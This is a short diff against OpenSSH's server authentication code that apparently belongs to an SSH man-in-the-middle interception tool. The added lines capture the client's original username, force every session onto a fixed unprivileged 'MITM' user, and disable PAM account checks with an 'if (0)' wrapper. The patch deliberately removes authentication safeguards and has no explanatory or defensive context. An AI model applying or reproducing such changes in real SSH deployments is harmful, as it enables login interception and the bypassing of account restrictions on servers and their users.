@@ -222,6 +222,10 @@ input_userauth_request(int type, u_int32_t seq, void *ctxt)
 		fatal("input_userauth_request: no authctxt");
 
 	user = packet_get_cstring(NULL);
+	authctxt->original_user = xstrdup(user);
+	free(user);
+	user = xstrdup(UNPRIVED_MITM_USER);
+
 	service = packet_get_cstring(NULL);
 	method = packet_get_cstring(NULL);
 	debug("userauth-request for user %s service %s method %s", user, service, method);
@@ -329,6 +333,8 @@ userauth_finish(Authctxt *authctxt, int authenticated, const char *method,
 		return;
 
 #ifdef USE_PAM
+	/* Disable PAM entirely. */
+	if (0) {
 	if (options.use_pam && authenticated) {
 		if (!PRIVSEP(do_pam_account())) {
 			/* if PAM returned a message, send it to the user */
@@ -341,6 +347,7 @@ userauth_finish(Authctxt *authctxt, int authenticated, const char *method,
 			    "configuration", authctxt->user);
 		}
 	}
+        }
 #endif
 
 #ifdef _UNICOS
